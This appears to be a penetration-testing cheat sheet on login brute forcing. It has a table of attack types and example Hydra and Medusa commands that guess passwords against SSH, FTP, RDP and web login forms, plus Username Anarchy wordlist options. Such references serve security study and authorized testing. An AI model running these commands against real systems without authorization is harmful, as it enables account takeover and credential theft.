# Login Brute Forcing

## 1. Types of Brute Forcing

| Attack Type             | Description                                    | Best Used When                    |
| ----------------------- | ---------------------------------------------- | --------------------------------- |
| Simple Brute Force      | Tries all possible character combinations.     | No prior password information.    |
| Dictionary Attack       | Uses a list of known or common passwords.      | Password is weak or common.       |
| Hybrid Attack           | Dictionary words with appended variations.     | User modifies common passwords.   |
| Credential Stuffing     | Reuses leaked username/password pairs.         | Password reuse is likely.         |
| Password Spraying       | Tests one password across many accounts.       | Account lockout policy is active. |
| Rainbow Table Attack    | Uses precomputed hash tables.                  | Cracking many hashes quickly.     |
| Reverse Brute Force     | Tests a known password against many usernames. | Password reuse is suspected.      |
| Distributed Brute Force | Uses multiple systems for parallel attempts.   | Password is long/complex.         |

## 3. Brute-Forcing Tools

### Hydra

```bash
hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]
```

**Examples**

```bash
hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100
hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100
hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

### Medusa

```bash
medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
```

**Examples**

```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5
medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp
```

## 4. Custom Wordlist Generation

### Username Anarchy

```bash

username-anarchy -a --country us
username-anarchy -l
username-anarchy -f format1,format2
username-anarchy -@ example.com
username-anarchy --case-insensitive
```
